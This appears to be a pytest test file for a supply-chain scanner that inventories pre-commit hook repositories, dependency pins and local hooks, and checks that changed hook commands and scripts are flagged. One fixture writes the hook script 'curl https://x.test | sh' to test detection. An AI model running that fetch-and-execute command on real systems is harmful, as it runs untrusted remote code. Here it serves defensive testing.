"""pre-commit hook repositories, revisions, local hooks, and additional
dependencies."""

from __future__ import annotations

import hashlib
from pathlib import Path

import pytest

from controlloop.acbom import Node
from controlloop.adapters import (
    DiscoveryResult,
    PreCommitAdapter,
    ScanContext,
    run_adapters,
)
from controlloop.adapters.pre_commit import (
    MAX_NODES,
    dependency_pin,
    repository_name,
)
from controlloop.bom import build_acbom_document
from controlloop.diff.compute import compute_diff
from controlloop.findings.models import FindingChangeState, FindingSeverity
from controlloop.policy.models import RuleContext
from controlloop.policy.rules import (
    agent_hook_command_change_findings,
    unpinned_agent_component_findings,
)
from controlloop.policy.rules.hook_script_changed import (
    findings as hook_script_changed_findings,
)
from controlloop.repository import resolve_repository_root

_CONFIG = ".pre-commit-config.yaml"
_SHA = "2c9f875913ee60ca25ce70243dc24d5b6415598c"
_OTHER_SHA = "cef0300fd0fc4d2a87a85fa2093c6b283ea36f4b"


def _write(root: Path, relative_path: str, content: str) -> None:
    target = root / relative_path
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content)


def _repo(url: str, rev: str, *hooks: str) -> str:
    body = "".join(f"      - id: {hook}\n" for hook in hooks or ("check",))
    return f"  - repo: {url}\n    rev: {rev}\n    hooks:\n{body}"


def _local(hook_id: str, entry: str, extra: str = "") -> str:
    return (
        "  - repo: local\n    hooks:\n"
        f"      - id: {hook_id}\n        name: {hook_id}\n"
        f"        entry: {entry}\n        language: system\n{extra}"
    )


def _config(*repos: str) -> str:
    return "repos:\n" + "".join(repos)


def _run(root: Path) -> DiscoveryResult:
    return run_adapters(
        [PreCommitAdapter()], ScanContext(root=resolve_repository_root(root))
    )


def _plugins(result: DiscoveryResult) -> dict[str, Node]:
    return {node.name: node for node in result.nodes if node.subtype == "plugin"}


def _context(head: Path, base: Path | None = None) -> RuleContext:
    current = build_acbom_document(resolve_repository_root(head))
    diff = None
    if base is not None:
        baseline = build_acbom_document(resolve_repository_root(base))
        diff = compute_diff(
            baseline_nodes=baseline.nodes,
            baseline_edges=baseline.edges,
            current_nodes=current.nodes,
            current_edges=current.edges,
        )
    return RuleContext(acbom=current, policy_version="test", diff=diff)


def _repos(tmp_path: Path) -> tuple[Path, Path]:
    base, head = tmp_path / "base", tmp_path / "head"
    base.mkdir()
    head.mkdir()
    return base, head


class TestRepositories:
    @pytest.mark.parametrize(
        ("rev", "pinned"),
        [
            (_SHA, True),
            (_SHA.upper(), True),
            ("v4.5.0", False),
            ("main", False),
            (_SHA[:12], False),
        ],
    )
    def test_only_a_full_commit_sha_pins_a_repository(
        self, tmp_path: Path, rev: str, pinned: bool
    ) -> None:
        _write(
            tmp_path,
            _CONFIG,
            _config(_repo("https://github.com/pre-commit/pre-commit-hooks", rev)),
        )

        (node,) = _plugins(_run(tmp_path)).values()

        assert node.name == (
            "pre-commit hook repository github.com/pre-commit/pre-commit-hooks"
        )
        assert node.attributes["source_type"] == "pre-commit-hook"
        assert node.attributes["ref"] == rev
        assert node.security_attributes.pinned is pinned

    def test_hook_ids_are_recorded_and_meta_is_ignored(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            _CONFIG,
            _config(
                _repo("https://github.com/acme/hooks", _SHA, "one", "two"),
                "  - repo: meta\n    hooks:\n      - id: check-hooks-apply\n",
            ),
        )

        result = _run(tmp_path)

        (node,) = _plugins(result).values()
        assert node.attributes["hook_ids"] == "one,two"
        assert sorted(n.subtype or "" for n in result.nodes) == ["host", "plugin"]

    @pytest.mark.parametrize(
        ("url", "name"),
        [
            ("https://github.com/psf/black", "github.com/psf/black"),
            ("https://github.com/psf/black.git", "github.com/psf/black"),
            ("git@github.com:psf/black.git", "github.com/psf/black"),
            ("https://user:secret@git.example.test/hooks/", "git.example.test/hooks"),
            ("ssh://git@git.example.test/hooks", "git.example.test/hooks"),
        ],
    )
    def test_repository_name(self, url: str, name: str) -> None:
        assert repository_name(url) == name

    def test_a_rev_change_keeps_the_component_identity(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        _write(base, _CONFIG, _config(_repo("https://github.com/acme/hooks", _SHA)))
        _write(head, _CONFIG, _config(_repo("https://github.com/acme/hooks", "v1")))

        (before,) = _plugins(_run(base)).values()
        (after,) = _plugins(_run(head)).values()

        assert before.id == after.id

    def test_the_older_bare_list_form_is_read(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            _CONFIG,
            f"- repo: https://github.com/acme/hooks\n  sha: x\n  rev: {_SHA}\n"
            "  hooks:\n    - id: check\n",
        )

        (node,) = _plugins(_run(tmp_path)).values()

        assert node.security_attributes.pinned is True

    def test_the_yml_spelling_is_read(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            ".pre-commit-config.yml",
            _config(_repo("https://github.com/acme/hooks", _SHA)),
        )

        assert _plugins(_run(tmp_path))


class TestDependencies:
    @pytest.mark.parametrize(
        ("requirement", "name", "pinned"),
        [
            ("click==8.1.7", "click", True),
            ("types-requests===2.31.0.6", "types-requests", True),
            ("black[jupyter]==24.2.0", "black[jupyter]", True),
            ("click>=8", "click", False),
            ("click==8.*", "click", False),
            ("click>=8,<9", "click", False),
            ("tomli", "tomli", False),
            ("eslint@8.57.0", "eslint", True),
            ("@typescript-eslint/parser@7.1.0", "@typescript-eslint/parser", True),
            ("eslint@^8", "eslint", False),
            ("@scope/pkg", "@scope/pkg", False),
            (
                "golang.org/x/tools/cmd/goimports@v0.18.0",
                "golang.org/x/tools/cmd/goimports",
                True,
            ),
            (
                "golang.org/x/tools/cmd/goimports@latest",
                "golang.org/x/tools/cmd/goimports",
                False,
            ),
        ],
    )
    def test_only_an_exact_version_pins_a_dependency(
        self, requirement: str, name: str, pinned: bool
    ) -> None:
        assert dependency_pin(requirement) == (name, pinned)

    def test_each_dependency_is_its_own_component(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            _CONFIG,
            _config(
                _repo("https://github.com/psf/black", _SHA, "black")
                + '        additional_dependencies: ["click==8.1.7", "tomli"]\n'
            ),
        )

        plugins = _plugins(_run(tmp_path))

        assert (
            plugins[
                "pre-commit hook repository github.com/psf/black"
            ].security_attributes.pinned
            is True
        )
        tomli = plugins["pre-commit dependency tomli for hook black"]
        assert tomli.attributes["source_type"] == "pre-commit-dependency"
        assert tomli.security_attributes.pinned is False
        assert (
            plugins[
                "pre-commit dependency click for hook black"
            ].security_attributes.pinned
            is True
        )


class TestLocalHooks:
    def test_a_local_hook_is_a_helper_command(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            _CONFIG,
            _config(
                _local(
                    "lint",
                    "ruff check",
                    "        stages: [pre-push, pre-commit]\n        args: [--fix]\n",
                )
            ),
        )

        result = _run(tmp_path)

        (node,) = [n for n in result.nodes if n.subtype == "helper-command"]
        assert node.attributes["setting"] == "lint"
        assert node.attributes["command"] == "ruff check --fix"
        assert node.attributes["event"] == "pre-commit,pre-push"
        assert node.attributes["language"] == "system"
        assert node.security_attributes.code_execution is True

    def test_default_stages_apply(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            _CONFIG,
            "default_stages: [pre-push]\n" + _config(_local("lint", "ruff check")),
        )

        (node,) = [n for n in _run(tmp_path).nodes if n.subtype == "helper-command"]

        assert node.attributes["event"] == "pre-push"

    def test_a_committed_script_is_tracked_by_digest(self, tmp_path: Path) -> None:
        body = b"#!/bin/sh\nexit 0\n"
        _write(tmp_path, _CONFIG, _config(_local("lint", "./scripts/lint.sh")))
        (tmp_path / "scripts").mkdir()
        (tmp_path / "scripts/lint.sh").write_bytes(body)

        (node,) = [n for n in _run(tmp_path).nodes if n.subtype == "helper-command"]

        assert node.attributes["script_path"] == "scripts/lint.sh"
        assert node.attributes["script_digest"] == (
            "sha256:" + hashlib.sha256(body).hexdigest()
        )

    def test_a_remote_hook_that_overrides_entry_is_a_command(
        self, tmp_path: Path
    ) -> None:
        _write(
            tmp_path,
            _CONFIG,
            _config(
                _repo("https://github.com/acme/hooks", _SHA, "check")
                + "        entry: ./run-anything.sh\n"
            ),
        )

        (node,) = [n for n in _run(tmp_path).nodes if n.subtype == "helper-command"]

        assert node.attributes["command"] == "./run-anything.sh"

    def test_duplicate_hook_ids_stay_distinct(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            _CONFIG,
            _config(_local("lint", "ruff check"), _local("lint", "ruff format")),
        )

        commands = [n for n in _run(tmp_path).nodes if n.subtype == "helper-command"]

        assert sorted(n.attributes["command"] for n in commands) == [
            "ruff check",
            "ruff format",
        ]
        assert len({n.id for n in commands}) == 2


class TestDiagnostics:
    def test_a_malformed_file_is_a_diagnostic(self, tmp_path: Path) -> None:
        _write(tmp_path, _CONFIG, "repos: [unclosed\n")

        result = _run(tmp_path)

        assert result.nodes == ()
        assert [d.code for d in result.diagnostics] == ["INCOMPLETE-UNPARSED-REGION"]

    @pytest.mark.parametrize(
        "content",
        [
            "repos: not-a-list\n",
            "repos:\n  - hooks: []\n",
            "repos:\n  - just-a-string\n",
            "- 1\n- 2\n",
            "42\n",
        ],
    )
    def test_an_unexpected_shape_is_a_diagnostic(
        self, tmp_path: Path, content: str
    ) -> None:
        _write(tmp_path, _CONFIG, content)

        result = _run(tmp_path)

        assert result.nodes == ()
        assert result.diagnostics
        assert all(d.code == "INCOMPLETE-UNPARSED-REGION" for d in result.diagnostics)

    def test_a_repository_without_rev_is_unpinned_and_reported(
        self, tmp_path: Path
    ) -> None:
        _write(
            tmp_path,
            _CONFIG,
            "repos:\n  - repo: https://github.com/acme/hooks\n"
            "    hooks:\n      - id: x\n",
        )

        result = _run(tmp_path)

        (node,) = _plugins(result).values()
        assert node.security_attributes.pinned is False
        assert [d.code for d in result.diagnostics] == ["INCOMPLETE-UNPARSED-REGION"]

    def test_yaml_aliases_cannot_multiply_nodes_without_bound(
        self, tmp_path: Path
    ) -> None:
        dependencies = ", ".join(f'"d{i}"' for i in range(500))
        _write(
            tmp_path,
            _CONFIG,
            "hooks: &hooks\n"
            + "".join(
                f"  - id: h{i}\n    additional_dependencies: [{dependencies}]\n"
                for i in range(20)
            )
            + "repos:\n"
            + "".join(
                f"  - repo: https://github.com/acme/r{i}\n    rev: {_SHA}\n"
                "    hooks: *hooks\n"
                for i in range(20)
            ),
        )

        result = _run(tmp_path)

        assert len(result.nodes) <= MAX_NODES + 1
        assert "INCOMPLETE-BOUND-EXCEEDED" in {d.code for d in result.diagnostics}


class TestExistingRulesReportTheseEntries:
    """No rule changes: the entries arrive in shapes the rules already read."""

    def test_a_sha_pinned_repository_added_is_low_and_a_tag_is_medium(
        self, tmp_path: Path
    ) -> None:
        base, head = _repos(tmp_path)
        _write(base, _CONFIG, "repos: []\n")
        _write(
            head,
            _CONFIG,
            _config(
                _repo("https://github.com/acme/pinned", _SHA),
                _repo("https://github.com/acme/tagged", "v1.2.3"),
            ),
        )

        findings = unpinned_agent_component_findings(_context(head, base))

        assert sorted((f.message, f.severity) for f in findings) == [
            (
                "Added: Pre-commit hook repository github.com/acme/pinned "
                "(pre-commit-hook) is pinned.",
                FindingSeverity.LOW,
            ),
            (
                "Added: Pre-commit hook repository github.com/acme/tagged "
                "(pre-commit-hook) has no commit or digest pin.",
                FindingSeverity.MEDIUM,
            ),
        ]

    def test_an_unchanged_sha_pinned_repository_is_silent(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        for root in (base, head):
            _write(root, _CONFIG, _config(_repo("https://github.com/acme/hooks", _SHA)))

        assert unpinned_agent_component_findings(_context(head, base)) == ()

    def test_a_rev_moved_to_another_sha_is_a_changed_pin(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        _write(base, _CONFIG, _config(_repo("https://github.com/acme/hooks", _SHA)))
        _write(
            head, _CONFIG, _config(_repo("https://github.com/acme/hooks", _OTHER_SHA))
        )

        (finding,) = unpinned_agent_component_findings(_context(head, base))

        assert finding.change_state is FindingChangeState.CHANGED
        assert finding.message == (
            "Pre-commit hook repository github.com/acme/hooks changed its ref. "
            "Pre-commit hook repository github.com/acme/hooks (pre-commit-hook) "
            "is pinned."
        )

    def test_an_unversioned_dependency_is_named_in_the_finding(
        self, tmp_path: Path
    ) -> None:
        base, head = _repos(tmp_path)
        repo = _repo("https://github.com/psf/black", _SHA, "black")
        _write(base, _CONFIG, _config(repo))
        _write(
            head,
            _CONFIG,
            _config(repo + '        additional_dependencies: ["tomli"]\n'),
        )

        (finding,) = unpinned_agent_component_findings(_context(head, base))

        assert finding.message == (
            "Added: Pre-commit dependency tomli for hook black "
            "(pre-commit-dependency) has no commit or digest pin."
        )

    def test_a_changed_local_hook_entry_is_reported(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        _write(base, _CONFIG, _config(_local("lint", "ruff check")))
        _write(head, _CONFIG, _config(_local("lint", "./scripts/upload.sh")))

        (finding,) = agent_hook_command_change_findings(_context(head, base))

        assert finding.change_state is FindingChangeState.CHANGED
        assert finding.severity is FindingSeverity.HIGH
        assert finding.message.startswith(
            "Changed: Setting 'lint' for host 'pre-commit' runs"
        )

    def test_a_changed_script_behind_a_local_hook_is_reported(
        self, tmp_path: Path
    ) -> None:
        base, head = _repos(tmp_path)
        for root, body in ((base, "exit 0\n"), (head, "curl https://x.test | sh\n")):
            _write(root, _CONFIG, _config(_local("lint", "./scripts/lint.sh")))
            _write(root, "scripts/lint.sh", body)

        (finding,) = hook_script_changed_findings(_context(head, base))

        assert finding.message == (
            "Setting 'lint' for host 'pre-commit' runs `scripts/lint.sh`, whose "
            "contents changed while the command did not."
        )
